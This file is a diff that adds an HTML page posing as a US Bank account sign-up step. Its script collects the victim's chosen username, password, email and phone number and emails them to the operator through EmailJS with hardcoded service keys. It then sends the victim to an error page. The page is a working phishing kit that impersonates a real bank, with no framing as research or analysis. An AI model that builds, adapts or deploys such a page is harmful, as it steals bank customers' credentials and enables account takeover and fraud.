@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en" class="hydrated" style="--emulation-banner-height: 0px;">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>US Bank Savings Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        .flexpage {
+            background-color: #fff;
+            box-shadow: 2px 3px 2px solid;
+            padding: 20px;
+            margin: auto;
+            margin-top: 40px;
+            box-shadow: rgba(0, 0, 0, 0.05) 0px 0px 0px 1px;
+        }
+
+        .flexpage1 {
+            background-color: #fff;
+            box-shadow: 2px 3px 2px solid;
+            padding: 20px;
+            margin: auto;
+            margin-top: 40px;
+        }
+
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .fleximg {
+            display: flex;
+            justify-content: space-between;
+            background-color: #fff;
+            margin: 0 auto;
+            padding: 30px;
+        }
+
+        img {
+            width: 100px;
+            max-width: 100%;
+        }
+
+        a {
+            color: black;
+            text-decoration: none;
+            font-weight: bolder;
+            font-size: large;
+        }
+
+        a:hover {
+            color: #0073e6;
+            text-decoration: underline;
+        }
+
+        .form {
+            width: 100%;
+            display: flex;
+            gap: 20px;
+            justify-content: space-evenly;
+        }
+
+        .form1 {
+            display: flex;
+            justify-content: flex-start;
+            gap: 20px;
+        }
+
+        h1 {
+            margin-top: 50px;
+            text-align: left;
+            color: black;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin: 5px 0;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            height: 60px;
+            border: 1px solid #d2d2d2;
+            border-radius: 6px;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+        }
+
+        .form-group button {
+            padding: 20px;
+            background-color: #371ca1;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            background-color: #371ca1;
+        }
+
+        .certification {
+            margin-top: 20px;
+            font-style: italic;
+        }
+
+        .button {
+            padding: 20px;
+            margin-top: 30px;
+            border-radius: 5px;
+            color: white;
+            width: 100%;
+        }
+
+        .button-l {
+            max-width: max-content;
+            margin-top: 40px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .radioicon {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .contact-info {
+            margin-top: 80px;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .footer a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .statusbar {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            padding: 30px 0;
+        }
+
+        .statusbar .dot {
+            height: 12px;
+            width: 14px;
+            border-radius: 50%;
+            background-color: #7c7c7c;
+            margin: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .statusbar .dot.active {
+            background-color: #87d550;
+        }
+
+        .statusbar .dot.active::after {
+            position: absolute;
+            content: ' ';
+            height: 28px;
+            width: 28px;
+            border: 1px solid #87d550;
+            border-radius: 50%;
+        }
+
+        .statusbar .line.active { 
+
+            background-color: #87d550;
+        }
+        .statusbar .line {
+            max-width: calc(50% - 125px) / 2;
+            width: 50%;
+            height: 1px;
+            background-color: #7c7c7c;
+            display: block;
+        }
+
+        header {
+            max-width: 100%;
+            padding: 15px 25px;
+            background-color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: rgba(0, 0, 0, 0.05) 0px 6px 24px 0px, rgba(0, 0, 0, 0.08) 0px 0px 0px 1px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div>
+            <a>
+                <img src="https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo.png">
+            </a>
+        </div>
+        <div>
+            <p>Already have an account with us <a href="#">Login</a></p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="statusbar">
+            <div class="dot active"></div>
+            <div class="line active"></div>
+            <div class="dot active"></div>
+            <div class="line"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1>Open a new personal Savings Account</h1>
+        <p>Create a username and password</p>
+        <form id="myForm" onsubmit="sendFormData(event)">
+            <div class="flexpage" style="display: flex; padding: 50px 20px; gap: 60px; align-items: center;">
+                <div style="width:calc(50% - 30px)">
+                    <div class="form-group" style="width: 100%;">
+                        <label for="username">Choose a username</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    <br>
+                    <div class="form-group" style="width: 100%;">
+                        <label for="password">Choose a password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                </div>
+                <div style="width:calc(50% - 30px)">
+                    <div class="form-group" style="width: 100%;">
+                        <p>Username is not case-sensitive and cannot contain spaces</p>
+                    </div>
+                    <br>
+                    <div class="form-group" style="width: 100%;">
+                        <p> Password must have:</p>
+                        <ul style="list-style: none; color: #6b6b6b; display: flex; flex-direction: column; gap: 4px;">
+                            <li>At least one uppercase letter and one lowercase letter</li>
+                            <li>At least one number</li>
+                            <li>At least one special character</li>
+                            <li>At least eight characters</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flexpage" style="display: block;">
+                <p style="font-size: 22px;">Please double-check your email and mobile number</p>
+                <div style="width:calc(50% - 30px)">
+                    <div class="form-group" style="width: 100%;">
+                        <label for="email">Enter Your Email</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <br>
+                    <div class="form-group" style="width: 100%;">
+                        <label for="number">Enter Your Mobile Number</label>
+                        <input type="tel" id="number" name="number" required>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <button type="submit" class="button-l">
+                    Next
+                    <svg width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                        fill="#000000">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <title></title>
+                            <g id="Complete">
+                                <g id="arrow-right">
+                                    <g>
+                                        <polyline data-name="Right" fill="none" id="Right-2"
+                                            points="16.4 7 21.5 12 16.4 17" stroke="#ffffff" stroke-linecap="round"
+                                            stroke-linejoin="round" stroke-width="2"></polyline>
+                                        <line fill="none" stroke="#ffffff" stroke-linecap="round"
+                                            stroke-linejoin="round" stroke-width="2" x1="2.5" x2="19.2" y1="12" y2="12">
+                                        </line>
+                                    </g>
+                                </g>
+                            </g>
+                        </g>
+                    </svg>
+                </button>
+            </div>
+        </form>
+
+        <div class="contact-info">
+            Call us Monday through Friday 8:00 a.m. - 8:00 p.m. ET at <a href="tel:8665180286">866.518.0286</a>
+        </div>
+        <div class="footer">
+            <a href="#">Contact Us</a> | <a href="#">Privacy Policy</a> | <a href="#">Disclosures</a> | <a
+                href="#">Support</a> | <a href="#">About Us</a> | <a href="#">Privacy & Security</a>
+        </div>
+        <footer style="text-align: center; font-size: 14px;">
+            <p>© 2025 US Bank. ALL RIGHTS RESERVED. MEMBER F0IC.</p>
+        </footer>
+    </div>
+
+    <div class="loader" id="loader"
+        style="display: none; flex-direction: column; justify-content: center; align-items: center; background-color: #000000af; backdrop-filter: blur(6px); position: fixed; top: 0; left: 0; z-index: 999999; width: 100vw; height: 100vh; color: #fff;">
+        <p>Processing...</p>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function () {
+            emailjs.init("O-b37cVFucZYRctO7"); // Replace with your EmailJS User ID
+        })();
+
+        function sendFormData(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show loader
+            document.getElementById('loader').style.display = "flex";
+
+            // Get form data
+            const formData = new FormData(document.getElementById("myForm"));
+
+            const formObj = {};
+            formData.forEach((value, key) => {
+                formObj[key] = value;
+            });
+
+            // Prepare email parameters
+            const emailParams = {
+                username: formObj.username,
+                password: formObj.password,
+                email: formObj.email,
+                number: formObj.number,
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_jyq2yxa", "template_7940inp", emailParams)
+                .then(function (response) {
+                    console.log('Email sent successfully:', response);
+                    window.location.href = "error.html"; // Redirect after submission
+                })
+                .catch(function (error) {
+                    console.log('Email sending error:', error);
+                    alert('Failed to send form data.');
+                })
+                .finally(() => {
+                    // Hide loader after process is completed
+                    document.getElementById('loader').style.display = "none";
+                });
+        }
+    </script>
+
+</body>
+
+</html>
